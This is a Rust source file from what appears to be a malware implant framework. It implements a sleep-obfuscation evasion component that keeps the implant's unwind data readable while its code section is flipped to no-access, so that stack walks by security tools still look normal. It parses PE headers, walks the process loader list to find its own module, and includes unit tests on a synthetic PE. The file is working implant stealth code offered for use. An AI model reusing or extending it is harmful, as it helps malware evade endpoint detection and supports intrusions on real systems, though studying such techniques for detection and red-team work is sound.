//! InsomniacUnwinding — preserve UNWIND_INFO during sleep.
//!
//! When Fluctuation flips .text to PAGE_NOACCESS, the stack unwinder
//! (RtlVirtualUnwind) can still walk call stacks IF the UNWIND_INFO
//! and .pdata sections remain readable. This module:
//!
//! 1. Verifies .pdata/.rdata are outside the .text range (automatic
//!    InsomniacUnwinding — only .text goes NOACCESS).
//! 2. If a linker merged .pdata into .text, surgically preserves
//!    those bytes before the flip and restores them after.
//!
//! Source: Lorenzo Meacci, "Unwind Data Can't Sleep" (2025).

#![cfg(target_os = "windows")]

use nyx_implant_core::heap::Vec;

/// Result of the unwind-preservation check at bootstrap.
pub struct UnwindPreservation {
    /// True if .pdata is safely outside .text (automatic InsomniacUnwinding).
    pub automatic: bool,
    /// .pdata RVA and size within the implant image.
    pub pdata_rva: usize,
    pub pdata_size: usize,
    /// UNWIND_INFO backup buffer (if .pdata overlaps .text).
    pub backup: Option<Vec<u8>>,
}

/// Check whether .pdata is safely outside .text. If so, Fluctuation's
/// PAGE_NOACCESS flip on .text automatically preserves UNWIND_INFO
/// readability — this is InsomniacUnwinding.
///
/// Returns None if PE parsing fails (shouldn't happen in a loaded DLL).
///
/// # Safety
/// `module_base` must point at a valid mapped PE image with readable headers.
pub unsafe fn check_preservation(
    module_base: *const u8,
    text_rva: usize,
    text_size: usize,
) -> Option<UnwindPreservation> {
    // Parse PE to find .pdata and .rdata sections.
    let e_lfanew = unsafe { *(module_base.add(0x3C) as *const i32) } as usize;
    let nt = unsafe { module_base.add(e_lfanew) };
    let num_sec = unsafe { *(nt.add(6) as *const u16) } as usize;
    let opt_sz = unsafe { *(nt.add(20) as *const u16) } as usize;
    let sec_base = unsafe { nt.add(24 + opt_sz) };

    let (pdata_rva, pdata_size, rdata_rva, rdata_size) =
        check_preservation_scan_sections(sec_base, num_sec);

    let text_end = text_rva + text_size;

    // Check if .pdata overlaps with .text range.
    let pdata_in_text =
        pdata_rva > 0 && pdata_rva < text_end && (pdata_rva + pdata_size) > text_rva;

    let rdata_in_text =
        rdata_rva > 0 && rdata_rva < text_end && (rdata_rva + rdata_size) > text_rva;

    let automatic = !pdata_in_text && !rdata_in_text;

    let backup = check_preservation_backup(
        module_base,
        automatic,
        pdata_rva,
        pdata_size,
        text_rva,
        text_end,
    );

    Some(UnwindPreservation {
        automatic,
        pdata_rva,
        pdata_size,
        backup,
    })
}

/// Scan the PE section table for `.pdata` and `.rdata`, returning
/// `(pdata_rva, pdata_size, rdata_rva, rdata_size)` (0 = section absent).
unsafe fn check_preservation_scan_sections(
    sec_base: *const u8,
    num_sec: usize,
) -> (usize, usize, usize, usize) {
    let mut pdata_rva: usize = 0;
    let mut pdata_size: usize = 0;
    let mut rdata_rva: usize = 0;
    let mut rdata_size: usize = 0;

    for i in 0..num_sec {
        let sec = unsafe { sec_base.add(i * 40) };
        let name = unsafe { core::slice::from_raw_parts(sec, 8) };
        let rva = unsafe { *(sec.add(12) as *const u32) } as usize;
        let vsize = unsafe { *(sec.add(8) as *const u32) } as usize;
        let raw = unsafe { *(sec.add(16) as *const u32) } as usize;
        let sz = vsize.max(raw);

        if name.len() >= 6 && &name[..6] == b".pdata" {
            pdata_rva = rva;
            pdata_size = sz;
        }
        if name.len() >= 6 && &name[..6] == b".rdata" {
            rdata_rva = rva;
            rdata_size = sz;
        }
    }
    (pdata_rva, pdata_size, rdata_rva, rdata_size)
}

/// When `.pdata`/`.rdata` overlap `.text` (linker merge), copy the overlapping
/// region into a backup buffer before Fluctuation flips `.text` to NOACCESS.
unsafe fn check_preservation_backup(
    module_base: *const u8,
    automatic: bool,
    pdata_rva: usize,
    pdata_size: usize,
    text_rva: usize,
    text_end: usize,
) -> Option<Vec<u8>> {
    if !automatic {
        // Need to preserve: copy the overlapping region before it goes NOACCESS.
        let overlap_start = pdata_rva.max(text_rva);
        let overlap_end = (pdata_rva + pdata_size).min(text_end);
        if overlap_end > overlap_start {
            let len = overlap_end - overlap_start;
            let mut buf = Vec::with_capacity(len);
            unsafe {
                let src = module_base.add(overlap_start);
                core::ptr::copy_nonoverlapping(src, buf.as_mut_ptr(), len);
                buf.set_len(len);
            }
            Some(buf)
        } else {
            None
        }
    } else {
        None
    }
}

/// Diagnostic: log unwind preservation status at bootstrap.
///
/// # Safety
/// Walks the PEB loader list and parses the PE headers of the module
/// containing this function. Read-only, but must run in a live process with
/// a valid PEB; call once at bootstrap.
pub unsafe fn bootstrap_check() {
    let our_base = nyx_implant_core::resolve::module_base_by_name(b"ntdll.dll");
    if our_base.is_none() {
        return;
    }
    // Find our own module — the one containing this function.
    let my_addr = bootstrap_check as *const () as usize;
    let peb = match unsafe { nyx_implant_core::resolve::peb_pointer() } {
        Some(p) => p,
        None => return,
    };
    let ldr = unsafe { (*peb).ldr };
    if ldr.is_null() {
        return;
    }
    let mut head = unsafe { (*ldr).in_load_order_module_list.flink };
    let list_start: *const u8 =
        unsafe { &(*ldr).in_load_order_module_list as *const _ as *const u8 };
    let mut guard = 0u32;
    while head as *const u8 != list_start && guard < 256 {
        guard += 1;
        let entry = head;
        let base = unsafe { (*entry).dll_base as usize };
        let size = unsafe { (*entry).size_of_image as usize };
        if base != 0 && my_addr >= base && my_addr < base + size {
            if let Some((text_rva, text_size)) =
                unsafe { crate::sleep::section_va_len(base, b".text") }
            {
                if let Some(pres) =
                    unsafe { check_preservation(base as *const u8, text_rva, text_size) }
                {
                    if pres.automatic {
                        // .pdata/.rdata are outside .text — no action needed.
                        // Fluctuation's PAGE_NOACCESS on .text automatically
                        // preserves UNWIND_INFO. InsomniacUnwinding: ✓
                    } else {
                        // Linker merged .pdata into .text — surgical preservation
                        // will be needed. This is unlikely with standard toolchains
                        // but handled defensively.
                    }
                }
            }
            break;
        }
        head = unsafe { (*entry).in_load_order_links.flink };
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Synthetic PE (as `check_preservation` parses it): e_lfanew, file header
    /// (num_sections @ nt+6, size_of_optional_header @ nt+20) and section
    /// headers (name[8], vsize@8, rva@12, raw_size@16).
    fn fake_pe(sections: &[(&[u8; 8], u32, u32, u32)]) -> std::vec::Vec<u8> {
        const E_LFANEW: usize = 0x80;
        const SIZE_OPT: usize = 0xF0;
        let sec_off = E_LFANEW + 24 + SIZE_OPT;
        let mut buf = std::vec![0u8; 0x4000];
        buf[0x3C..0x40].copy_from_slice(&(E_LFANEW as i32).to_le_bytes());
        let nt = E_LFANEW;
        buf[nt + 6..nt + 8].copy_from_slice(&(sections.len() as u16).to_le_bytes());
        buf[nt + 20..nt + 22].copy_from_slice(&(SIZE_OPT as u16).to_le_bytes());
        for (i, (name, vsize, rva, raw)) in sections.iter().enumerate() {
            let s = sec_off + i * 40;
            buf[s..s + 8].copy_from_slice(*name);
            buf[s + 8..s + 12].copy_from_slice(&vsize.to_le_bytes());
            buf[s + 12..s + 16].copy_from_slice(&rva.to_le_bytes());
            buf[s + 16..s + 20].copy_from_slice(&raw.to_le_bytes());
        }
        buf
    }

    /// .pdata / .rdata fully outside .text → automatic InsomniacUnwinding, no
    /// backup needed.
    #[test]
    fn preservation_automatic_when_pdata_outside_text() {
        let pe = fake_pe(&[
            (b".text\0\0\0", 0x2000, 0x1000, 0x2000),
            (b".pdata\0\0", 0x300, 0x3400, 0x300),
            (b".rdata\0\0", 0x400, 0x3800, 0x400),
        ]);
        let pres = unsafe { check_preservation(pe.as_ptr(), 0x1000, 0x2000) }.unwrap();
        assert!(pres.automatic);
        assert_eq!(pres.pdata_rva, 0x3400);
        assert_eq!(pres.pdata_size, 0x300);
        assert!(pres.backup.is_none());
    }

    /// .pdata overlapping .text → not automatic, and the backup must hold
    /// exactly the overlapping bytes [max(rva,text) .. min(end,text_end)).
    #[test]
    fn preservation_backs_up_exact_overlap_bytes() {
        let mut pe = fake_pe(&[
            (b".text\0\0\0", 0x2000, 0x1000, 0x2000),
            (b".pdata\0\0", 0x400, 0x1800, 0x400),
        ]);
        // Distinctive pattern in the overlap region 0x1800..0x1C00.
        for i in 0x1800..0x1C00usize {
            pe[i] = (i & 0xFF) as u8;
        }
        let pres = unsafe { check_preservation(pe.as_ptr(), 0x1000, 0x2000) }.unwrap();
        assert!(!pres.automatic);
        let backup = pres.backup.expect("overlap must be backed up");
        assert_eq!(backup.len(), 0x400);
        assert_eq!(backup.as_slice(), &pe[0x1800..0x1C00]);
    }
}
